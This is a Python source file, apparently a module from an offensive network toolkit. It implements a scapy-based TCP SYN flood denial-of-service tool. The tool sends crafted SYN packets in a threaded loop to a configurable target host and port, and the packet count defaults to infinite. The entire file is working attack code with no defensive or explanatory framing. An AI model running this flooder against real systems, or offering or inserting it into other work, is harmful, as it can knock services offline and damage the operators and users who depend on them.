from scapy.all import *
from threading import Thread
from dos import DoS
from util import Msg


class tcp_syn(DoS):
    def __init__(self):
        """ Simple TCP SYN flooder.  Absolutely nothing fancy, and could
            probably use some love.
        """
        super(tcp_syn, self).__init__('TCP SYN')
        conf.verb = 0
        self.config.update({"port":{"type":"int", 
                                    "value":80,
                                    "required":False, 
                                    "display":"Attack port"},
                            "count":{"type":"int", 
                                     "value":-1,
                                     "required":False,
                      "display":"Number of packets to send (-1 infinite)"}
                           })
        self.info = """
                    Very basic TCP SYN flooder that just spams SYN packets
                    towards the host/port.
                    """

    def initialize(self):
        Msg('Flooding \'%s\'...' % self.config['target']['value'])
        thread = Thread(target=self.flood)
        self.running = True
        thread.start()
        return True

    def flood(self):
        """ Send packets
        """
        pkt = IP(dst=self.config['target']['value'])
        pkt /= TCP(dport=self.config['port']['value'],
                                                    window=1000, flags='S')
        cnt = 0
        while self.running:
            if self.config['count']['value'] > 0 and \
                cnt >= self.config['count']['value']:
                break

            send(pkt)
            cnt += 1
        self.shutdown()

    def session_view(self):
        """ return ip/port of spammed host
        """
        return "%s:%d" % (self.config['target']['value'],
                          self.config['port']['value'])